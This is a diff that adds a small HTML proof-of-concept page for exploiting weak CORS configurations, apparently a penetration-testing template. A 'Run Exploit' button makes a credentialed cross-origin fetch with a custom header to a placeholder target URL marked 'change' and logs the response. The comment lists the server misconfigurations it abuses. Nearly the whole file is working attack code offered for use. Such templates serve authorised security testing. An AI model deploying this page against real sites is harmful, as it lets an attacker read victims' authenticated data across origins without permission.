@@ -1,0 +1,42 @@
+<!doctype html>
+<!--
+CORS PoC: Custom header request.
+
+Useful when:
+- Server improperly allows arbitrary headers via Access-Control-Allow-Headers
+- Preflight validation is weak
+- API trusts custom headers cross-origin
+-->
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CORS Custom Header</title>
+</head>
+<body>
+
+<button id="run">Run Exploit</button>
+
+<script>
+  const TARGET_URL = "https://vulnerable-site.example/api/endpoint"; // change
+
+  document.getElementById("run").onclick = async () => {
+    try {
+      const response = await fetch(TARGET_URL, {
+        credentials: "include",
+	// Add or update relevant response headers in Access-Control-Allow-Headers
+        headers: {
+          "X-Test": "cors-check" 
+        }
+      });
+
+      const data = await response.text();
+      console.log("RESPONSE:", data);
+
+    } catch (err) {
+      console.error("Request failed:", err);
+    }
+  };
+</script>
+
+</body>
+</html>
